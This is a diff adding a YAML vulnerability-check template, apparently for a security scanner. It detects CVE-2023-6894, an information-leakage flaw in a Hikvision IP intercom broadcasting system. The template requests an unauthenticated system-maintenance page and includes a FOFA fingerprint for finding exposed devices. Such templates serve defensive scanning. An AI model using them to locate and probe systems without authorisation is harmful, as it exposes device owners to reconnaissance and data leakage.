@@ -1,0 +1,16 @@
+id: poc-yaml-hikvision-ip-network-intercom-broadcasting-system-system-html-information-leakage
+info:
+  name: 海康威视 IP网络对讲广播系统 system.html 信息泄露漏洞(CVE-2023-6894)
+  severity: high
+  tags:
+  - CVE-2023-6894
+  - 信息泄露
+  finger: IP网络对讲广播系统
+  fofa: icon_hash="-1830859634"
+requests:
+- method: GET
+  path: /html/system.html
+  expression: status_code == 200 && contains(body,"<title id=\"title\">系统维护</title>")
+    && contains(body,"系统日志") && contains(body,"网络诊断")
+variables: {}
+transport: http
